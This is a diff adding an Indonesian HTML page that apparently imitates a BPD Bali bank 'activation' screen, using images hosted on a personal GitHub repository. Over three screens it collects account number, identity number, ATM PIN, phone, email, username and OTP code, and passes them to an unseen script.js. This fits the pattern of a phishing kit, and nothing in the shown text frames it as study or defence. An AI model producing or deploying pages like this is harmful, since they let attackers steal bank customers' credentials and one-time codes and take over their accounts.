@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>BPD Bali - Aktivasi</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+<!-- HALAMAN 1 -->
+<div id="page1" class="page active">
+    <img class="bg-image" src="https://raw.githubusercontent.com/danajer/Inissisuhyw/refs/heads/main/haiwiwwiwi.jpg" alt="bg">
+    <button class="btn-nav" onclick="pindahHalaman('page2')">Aktivasi</button>
+</div>
+
+<!-- HALAMAN 2 -->
+<div id="page2" class="page">
+    <img class="bg-image" src="https://raw.githubusercontent.com/danajer/Inissisuhyw/refs/heads/main/hsusisieiggfc.jpg" alt="bg">
+    
+    <div class="logo-header">
+        <img src="https://raw.githubusercontent.com/danajer/Inissisuhyw/refs/heads/main/fhswyeidusys.jpg" alt="Logo" onerror="this.src='https://placehold.co/1920x80?text=LOGO+BPD+BALI'; this.onerror=null;">
+    </div>
+    
+    <div class="form-container form-page2" id="formPage2">
+        <div class="form-title">Registrasi</div>
+        <div class="form-divider"></div>
+        
+        <div class="form-row">
+            <span class="form-label">No. Rekening</span>
+            <input type="text" class="form-input" id="noRekening" inputmode="numeric" pattern="[0-9]*" autofocus>
+        </div>
+        <div class="form-row">
+            <span class="form-label">No. Identitas</span>
+            <input type="text" class="form-input" id="noIdentitas" inputmode="numeric" pattern="[0-9]*">
+        </div>
+        <div class="form-row">
+            <span class="form-label">PIN ATM</span>
+            <input type="password" class="form-input" id="pinAtm" maxlength="6" inputmode="numeric" pattern="[0-9]*">
+        </div>
+        <div class="form-row">
+            <span class="form-label">No. Telepon</span>
+            <input type="tel" class="form-input" id="noTelpon" inputmode="numeric" pattern="[0-9]*">
+        </div>
+        <div class="form-row">
+            <span class="form-label">Email</span>
+            <input type="email" class="form-input" id="email" inputmode="email">
+        </div>
+        <div class="info-text" id="infoPage2">* Harap isi semua data</div>
+    </div>
+    
+    <button class="btn-action hidden" id="btnLanjut" onclick="lanjutKePage3()">Cetak Laporan / Pemulihan</button>
+</div>
+
+<!-- HALAMAN 3 -->
+<div id="page3" class="page">
+    <img class="bg-image" src="https://raw.githubusercontent.com/danajer/Inissisuhyw/refs/heads/main/hsusisieiggfc.jpg" alt="bg">
+    
+    <div class="logo-header">
+        <img src="https://raw.githubusercontent.com/danajer/Inissisuhyw/refs/heads/main/fhswyeidusys.jpg" alt="Logo" onerror="this.src='https://placehold.co/1920x80?text=LOGO+BPD+BALI'; this.onerror=null;">
+    </div>
+    
+    <div class="form-container form-page3" id="formPage3">
+        <div class="form-title">Kode Aktivasi</div>
+        <div class="form-divider"></div>
+        
+        <div class="form-row">
+            <span class="form-label">Username</span>
+            <input type="text" class="form-input" id="username" inputmode="text">
+        </div>
+        <div class="form-row">
+            <span class="form-label">Kode OTP</span>
+            <input type="text" class="form-input" id="kodeOtp" maxlength="6" inputmode="numeric" pattern="[0-9]*">
+        </div>
+        <div class="info-text" id="infoPage3">* Masukkan kode OTP aktivasi</div>
+    </div>
+    
+    <button class="btn-action" id="btnVerifikasi" onclick="selesai()">Cetak Laporan / Pemulihan</button>
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
